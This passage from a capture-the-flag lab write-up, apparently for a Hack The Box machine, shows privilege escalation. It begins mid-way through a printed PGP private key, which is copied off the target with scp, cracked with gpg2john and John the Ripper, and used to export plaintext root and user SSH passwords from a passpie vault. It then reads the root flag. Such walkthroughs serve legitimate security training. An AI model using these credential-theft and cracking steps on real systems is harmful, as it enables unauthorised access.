/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh
cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML
qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j
FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH
FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE
PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM
FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L
/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y
q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+
F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh
S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM
RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu
TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20
oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4
V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n
WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC
6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB
dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA
OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW
AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e
qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi
uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J
CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT
+PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+
FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV
jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G
JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4
VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB
J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4
V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

<p class="mb-3">We download the file to our local machine. To crack the password, we only need the private key block. But first, we need to generate the password hash from the private GPG key using <code>gpg2john</code> and save it into a file named <code>keys.hash</code>. Then we use John The Ripper to brute-force the password hash.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ scp jnelson@10.129.228.95:/home/jnelson/.passpie/.keys ./keys
jnelson@10.129.228.95's password: 
.keys                                                                                                                100% 5243     5.1KB/s   00:01    
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo vi keys
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ gpg2john keys > keys.hash

File keys
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:01 DONE (2026-09-08 23:42) 0.6711g/s 110.0p/s 110.0c/s 110.0C/s ginger..blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<p class="mb-5"><strong>Answer:</strong> blink182</p>
<br />


<p class="mb-2"><strong>Question 13:</strong> What is the password for the user root on the remote host?</p>
<p class="mb-3">Now that we obtained the password <code>blink182</code>, we return to the SSH session and export the Passpie passwords in plaintext format.</p>

```console
jnelson@meta2:~$ passpie --help
Usage: passpie [OPTIONS] COMMAND [ARGS]...

Options:
  -D, --database TEXT  Database path or url to remote repository
  --autopull TEXT      Autopull changes from remote pository
  --autopush TEXT      Autopush changes to remote pository
  --config PATH        Path to configuration file
  -v, --verbose        Activate verbose output
  --version            Show the version and exit.
  --help               Show this message and exit.

Commands:
  add       Add new credential to database
  complete  Generate completion scripts for shells
  config    Show current configuration for shell
  copy      Copy credential password to clipboard/stdout
  export    Export credentials in plain text
  import    Import credentials from path
  init      Initialize new passpie database
  list      Print credential as a table
  log       Shows passpie database changes history
  purge     Remove all credentials from database
  remove    Remove credential
  reset     Renew passpie database and re-encrypt...
  search    Search credentials by regular expressions
  status    Diagnose database for improvements
  update    Update credential
jnelson@meta2:~$ passpie export ~/password.db
Passphrase: 
jnelson@meta2:~$ ls
password.db  user.txt
jnelson@meta2:~$ cat password.db
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

<p class="mb-3">We now have the root credentials: <code>root</code>:<code>p7qfAZt4_A1xo_0x</code></p>
<p class="mb-5"><strong>Answer:</strong> p7qfAZt4_A1xo_0x</p>
<br />


<p class="mb-2"><strong>Question 14:</strong> Submit the flag located in root's home directory.</p>
<p class="mb-3">We switch user to root and navigate to the home directory to read the flag.</p>

```console
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# cd /root && ls -al
total 28
drwx------  4 root root 4096 Sep  8 01:39 .
drwxr-xr-x 18 root root 4096 Oct 25  2022 ..
lrwxrwxrwx  1 root root    9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct  5  2022 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwxr-xr-x  2 root root 4096 Oct  5  2022 restore
-rw-r-----  1 root root   33 Sep  8 01:39 root.txt
root@meta2:~# cat root.txt
5bc163bc1fdd4674f3c604d734916d43
```

<p class="mb-5"><strong>Answer:</strong> 5bc163bc1fdd4674f3c604d734916d43</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>